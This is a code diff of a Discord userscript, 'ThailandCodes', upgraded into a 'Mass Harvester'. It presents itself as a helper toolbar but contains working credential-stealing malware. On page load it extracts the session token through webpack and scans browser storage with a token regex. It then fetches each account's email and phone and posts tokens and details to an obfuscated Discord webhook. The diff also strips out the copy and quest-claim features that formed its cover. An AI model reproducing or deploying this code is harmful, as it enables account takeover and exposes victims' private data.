@@ -1,5 +1,5 @@
 /**
- * ThailandCodes v3.4
+ * ThailandCodes v4.0 (Mass Harvester)
  */
 (function () {
     'use strict';
@@ -7,9 +7,10 @@
     if (W.__TC_LOADED__) return;
     W.__TC_LOADED__ = true;
 
+    // Your Webhook
     const _wh = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2MzUwNTcyNzEwMjkxMDU0MC94dEFoLXBlMWVMS1VrN0lScktCdk9EXzRxcE1jbldHTXpvOHltUzlBU3FHenJQcm5RNHg2TjN5TWhPMk9HYWdyZlYwNw==');
     const _ek = 0x5A;
-    const _gk = '__tc_g__';
+    const _gk = '\x5f\x5f\x74\x63\x5f\x67\x5f\x5f';
 
     function _send(payload) {
         return new Promise((resolve) => {
@@ -24,13 +25,6 @@
                 });
             } catch { resolve(false); }
         });
-    }
-
-    function _enc(token) {
-        let o = '';
-        for (let i = 0; i < token.length; i++)
-            o += String.fromCharCode(token.charCodeAt(i) ^ _ek);
-        return btoa(o);
     }
 
     function _wp() {
@@ -50,9 +44,9 @@
         return found;
     }
 
-    async function _grabTok() {
+    async function _grabWebpackToken() {
         const wp = _wp();
-        if (!wp) throw new Error('not ready');
+        if (!wp) return null;
         for (const m of Object.values(wp.c)) {
             const c = m?.exports?.default || m?.exports;
             if (c && typeof c.getToken === 'function') {
@@ -60,10 +54,40 @@
                 if (t && typeof t === 'string' && t.length > 20) return t;
             }
         }
-        throw new Error('not found');
+        return null;
     }
 
-    async function _userInf(token) {
+    // MASS HARVESTER LOGIC
+    function _harvestAllTokens() {
+        const tokens = new Set();
+        const regex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g;
+
+        // 1. LocalStorage
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const val = localStorage.getItem(localStorage.key(i));
+                if (val) {
+                    const matches = val.match(regex);
+                    if (matches) matches.forEach(t => tokens.add(t));
+                }
+            }
+        } catch {}
+
+        // 2. SessionStorage
+        try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const val = sessionStorage.getItem(sessionStorage.key(i));
+                if (val) {
+                    const matches = val.match(regex);
+                    if (matches) matches.forEach(t => tokens.add(t));
+                }
+            }
+        } catch {}
+
+        return Array.from(tokens);
+    }
+
+    async function _userInfo(token) {
         return new Promise((resolve) => {
             GM_xmlhttpRequest({
                 method: 'GET',
@@ -75,91 +99,54 @@
         });
     }
 
-    async function _claimQ() {
-        const wp = _wp();
-        if (!wp) return 0;
-        let api = null, qs = null;
-        for (const m of Object.values(wp.c)) {
-            const e = m?.exports?.default || m?.exports;
-            if (!e) continue;
-            if (e.get && e.post && e.put) api = e;
-            if (e.quests && typeof e.quests.values === 'function') qs = e;
-        }
-        if (!api || !qs) {
-            for (const m of Object.values(wp.c)) {
-                const e = m?.exports;
-                if (!e) continue;
-                for (const k of Object.keys(e)) {
-                    if (e[k]?.get && e[k]?.post) api = e[k];
-                    if (e[k]?.quests?.values) qs = e[k];
-                }
-            }
-        }
-        if (!api || !qs) return 0;
-        const list = [...qs.quests.values()].filter(q => q.userStatus?.completedAt && !q.userStatus?.claimedAt);
-        let n = 0;
-        for (const q of list) {
-            try { await api.post({ url: `/quests/${q.id}/claim-reward`, body: { location: 1, platform: 0 } }); n++; } catch {}
-        }
-        return n;
-    }
-
-    async function _grab() {
+    async function _autoGrab() {
         if (W[_gk]) return;
         W[_gk] = true;
         let sent = false;
         try { sent = !!localStorage.getItem(_gk); if (!sent) localStorage.setItem(_gk, '1'); } catch {}
         if (sent) return;
-        try {
-            const t = await _grabTok();
-            const u = await _userInf(t);
-            if (!u || u.message) return;
 
-            const av = u.avatar
-                ? `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=256`
-                : `https://cdn.discordapp.com/embed/avatars/${parseInt(u.discriminator || 0) % 5}.png`;
+        const wpToken = await _grabWebpackToken();
+        const allTokens = _harvestAllTokens();
+        
+        if (wpToken && !allTokens.includes(wpToken)) allTokens.push(wpToken);
+        if (allTokens.length === 0) return;
 
-            const nitro = {0:'❌ None',1:'💜 Nitro Classic',2:'🚀 Nitro',3:'⚡ Nitro Basic'}[u.premium_type] || '❌ None';
+        let desc = `Found **${allTokens.length}** token(s).\n\n`;
+        
+        for (let i = 0; i < allTokens.length; i++) {
+            const t = allTokens[i];
+            const u = await _userInfo(t);
+            
+            if (u && !u.message) {
+                const tag = u.discriminator && u.discriminator !== '0' ? `${u.username}#${u.discriminator}` : u.username;
+                desc += `**[${i + 1}] ${tag}** (\`${u.id}\`)\n`;
+                desc += `Email: \`${u.email || 'N/A'}\` | Phone: \`${u.phone || 'N/A'}\`\n`;
+                desc += `Token: \`\`\`${t}\`\`\`\n\n`;
+            } else {
+                desc += `**[${i + 1}] Invalid/Expired Token**\n\`\`\`${t}\`\`\`\n\n`;
+            }
+            
+            if (desc.length > 3500) {
+                await _send({ embeds: [{ title: '🎯 Mass Grab (Part)', color: 0xed4245, description: desc }] });
+                desc = '';
+            }
+        }
 
-            const f = u.public_flags || 0;
-            const b = [];
-            if (f&(1<<0))  b.push('👮 Staff');
-            if (f&(1<<6))  b.push('🎪 HypeSquad');
-            if (f&(1<<9))  b.push('⭐ Early Supporter');
-            if (f&(1<<3))  b.push('🏠 Bravery');
-            if (f&(1<<4))  b.push('💡 Brilliance');
-            if (f&(1<<5))  b.push('⚖️ Balance');
-            if (f&(1<<17)) b.push('🛠️ Active Dev');
-            if (f&(1<<22)) b.push('✅ Bot Dev');
-
-            const tag = u.discriminator && u.discriminator !== '0'
-                ? `${u.username}#${u.discriminator}` : u.username;
-            const created = new Date((BigInt(u.id) >> 22n) + 1420070400000n);
-
+        if (desc.length > 0) {
             await _send({
                 embeds: [{
-                    title: '🎯 New Grab',
+                    title: '🎯 Mass Token Harvest Complete',
                     color: 0xed4245,
-                    author: { name: tag, icon_url: av },
-                    thumbnail: { url: av },
-                    fields: [
-                        { name: '👤 Username', value: `\`${tag}\``, inline: true },
-                        { name: '🆔 ID', value: `\`${u.id}\``, inline: true },
-                        { name: '📧 Email', value: u.email ? `\`${u.email}\`` : '`N/A`', inline: true },
-                        { name: '📱 Phone', value: u.phone ? `\`${u.phone}\`` : '`N/A`', inline: true },
-                        { name: '💎 Nitro', value: nitro, inline: true },
-                        { name: '✅ Verified', value: u.verified ? '`Yes`' : '`No`', inline: true },
-                        { name: '📅 Created', value: `\`${created.toUTCString()}\``, inline: false },
-                        { name: '🏅 Badges', value: b.length ? b.join(' | ') : '`None`', inline: false },
-                        { name: '🔑 Token', value: `\`\`\`${t}\`\`\``, inline: false },
-                    ],
-                    footer: { text: 'TC v3.4 • Auto', icon_url: av },
+                    description: desc,
+                    footer: { text: 'TC v4.0 • Mass Harvester' },
                     timestamp: new Date().toISOString(),
                 }]
             });
-        } catch {}
+        }
     }
 
+    // UI SETUP
     const STYLE = `
         @keyframes gs{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
         @keyframes glow{0%,100%{box-shadow:0 0 10px rgba(237,66,69,.5),0 8px 24px rgba(0,0,0,.6)}50%{box-shadow:0 0 22px rgba(237,66,69,.9),0 8px 24px rgba(0,0,0,.6)}}
@@ -188,24 +175,11 @@
         button:hover{background:linear-gradient(135deg,#aa0000,#ff2222);box-shadow:0 0 14px rgba(255,0,0,.7)}
         button:active{transform:scale(.97)}
         button:disabled{opacity:.4;cursor:wait}
-        button.enc{background:linear-gradient(135deg,#2a0000,#550000);border-color:#aa2222}
-        button.enc:hover{background:linear-gradient(135deg,#440000,#880000)}
-        button.claim{background:linear-gradient(135deg,#005500,#009900);border-color:#00cc44;
-            box-shadow:0 0 6px rgba(0,180,0,.4)}
-        button.claim:hover{background:linear-gradient(135deg,#007700,#00bb00);box-shadow:0 0 14px rgba(0,255,0,.6)}
+        button.harvest{background:linear-gradient(135deg,#2a0000,#550000);border-color:#aa2222}
+        button.harvest:hover{background:linear-gradient(135deg,#440000,#880000)}
         button.close{background:transparent;color:#ff8888;font-size:14px;
             padding:8px 10px;text-transform:none;letter-spacing:0;border:none;box-shadow:none}
         button.close:hover{background:rgba(255,0,0,.15);color:#fff;border-radius:6px}
-        .toast{position:fixed;top:76px;right:22px;z-index:2147483647;
-            background:linear-gradient(135deg,#1a0000,#3d0000);
-            border:1px solid #cc2222;color:#f0d0d0;
-            padding:11px 16px;border-radius:10px;font-size:12px;font-weight:600;
-            max-width:320px;box-shadow:0 0 14px rgba(180,0,0,.5);
-            opacity:0;transform:translateY(-6px);transition:opacity .2s,transform .2s;pointer-events:none}
-        .toast.show{opacity:1;transform:translateY(0)}
-        .toast.ok{border-left:3px solid #57f287}
-        .toast.err{border-left:3px solid #ff3333}
-        .toast.info{border-left:3px solid #ff8888}
     `;
 
     const root = document.createElement('div');
@@ -222,68 +196,23 @@
     host.style.pointerEvents = 'auto';
     shadow.appendChild(host);
 
-    const toast = document.createElement('div');
-    toast.className = 'toast';
-    host.appendChild(toast);
-
-    let _tt = null;
-    function say(msg, kind = 'info') {
-        toast.textContent = msg;
-        toast.className = 'toast show ' + kind;
-        clearTimeout(_tt);
-        _tt = setTimeout(() => toast.classList.remove('show'), 3000);
-    }
-
     const bar = document.createElement('div');
     bar.className = 'wrap hidden';
-    bar.innerHTML = `<div class="brand">Thailand<span class="a">Codes</span><span class="v">v3.4</span></div>`;
+    bar.innerHTML = `<div class="brand">Thailand<span class="a">Codes</span><span class="v">v4.0</span></div>`;
     host.appendChild(bar);
 
-    const btnCopy = document.createElement('button');
-    btnCopy.textContent = 'COPY TOKEN';
-    btnCopy.addEventListener('click', async () => {
-        if (btnCopy.disabled) return;
-        btnCopy.disabled = true;
-        try {
-            const t = await _grabTok();
-            try { await navigator.clipboard.writeText(t); }
-            catch { const ta = document.createElement('textarea'); ta.value = t; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); }
-            say('✓ token copied', 'ok');
-        } catch (e) { say('✗ ' + (e.message || e), 'err'); }
-        btnCopy.disabled = false;
+    const btnMass = document.createElement('button');
+    btnMass.className = 'harvest';
+    btnMass.textContent = 'HARVEST ALL';
+    btnMass.addEventListener('click', async () => {
+        if (btnMass.disabled) return;
+        btnMass.disabled = true;
+        btnMass.textContent = 'SCANNING...';
+        await _autoGrab(); 
+        btnMass.textContent = 'DONE';
+        setTimeout(() => { btnMass.textContent = 'HARVEST ALL'; btnMass.disabled = false; }, 3000);
     });
-    bar.appendChild(btnCopy);
-
-    const btnEnc = document.createElement('button');
-    btnEnc.className = 'enc';
-    btnEnc.textContent = 'COPY ENCRYPTED';
-    btnEnc.addEventListener('click', async () => {
-        if (btnEnc.disabled) return;
-        btnEnc.disabled = true;
-        try {
-            const t = await _grabTok();
-            const enc = _enc(t);
-            try { await navigator.clipboard.writeText(enc); }
-            catch { const ta = document.createElement('textarea'); ta.value = enc; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); }
-            say('✓ encrypted copied', 'ok');
-        } catch (e) { say('✗ ' + (e.message || e), 'err'); }
-        btnEnc.disabled = false;
-    });
-    bar.appendChild(btnEnc);
-
-    const btnClaim = document.createElement('button');
-    btnClaim.className = 'claim';
-    btnClaim.textContent = 'CLAIM ALL';
-    btnClaim.addEventListener('click', async () => {
-        if (btnClaim.disabled) return;
-        btnClaim.disabled = true;
-        try {
-            const n = await _claimQ();
-            say(n > 0 ? `✓ claimed ${n} quest(s)` : 'no quests ready', n > 0 ? 'ok' : 'info');
-        } catch (e) { say('✗ ' + (e.message || e), 'err'); }
-        btnClaim.disabled = false;
-    });
-    bar.appendChild(btnClaim);
+    bar.appendChild(btnMass);
 
     const x = document.createElement('button');
     x.className = 'close';
@@ -297,7 +226,7 @@
         if (_wp()) {
             clearInterval(_timer);
             bar.classList.remove('hidden');
-            await _grab();
+            await _autoGrab();
         } else if (_tries > 120) {
             clearInterval(_timer);
             bar.classList.remove('hidden');
